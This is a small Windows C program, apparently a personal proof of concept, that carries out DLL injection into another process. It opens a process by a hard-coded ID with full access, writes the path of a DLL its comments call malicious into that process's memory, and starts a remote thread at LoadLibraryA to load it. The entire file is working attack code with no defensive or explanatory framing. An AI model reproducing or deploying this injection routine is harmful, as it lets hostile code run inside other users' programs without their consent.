#include <Windows.h>

int main()
{
	//Get an existing Process's HANDEL by OpenProcess():
	HANDLE targetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 12228);
	if (NULL == targetProcess)
	{
		return 1;
	}

	//set Malicious Dll's Path:
	CHAR dllToInject[] = "C:\\Users\\Shahar\\source\\repos\\DllToInject\\x64\\Debug\\DllToInject.dll";

	//Allocate memory in the Process:
	LPVOID dllNameAddress = VirtualAllocEx(
		targetProcess,
		NULL,
		sizeof(dllToInject) * sizeof(CHAR),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (NULL == dllNameAddress)
	{
		return 1;
	}

	// writeProcessMemory
	BOOL writeDllPath = WriteProcessMemory(
		targetProcess,
		dllNameAddress,
		dllToInject,
		sizeof(dllToInject),
		NULL
	);

	if (NULL == writeDllPath)
	{
		return 1;
	}

	// GetProcAddress of LoadLibrary: (PARAMS = from which DLL and which function)
	LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");


	// CreateRemoteThread of LoadLibrary with dllNameAddress as param
	HANDLE remoteThread = CreateRemoteThreadEx(
		targetProcess,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)loadLibraryAddress,
		dllNameAddress,
		0,
		NULL,
		NULL);

	if (NULL == remoteThread)
	{
		DWORD p = GetLastError();
		return 1;
	}
	
	return 0;
}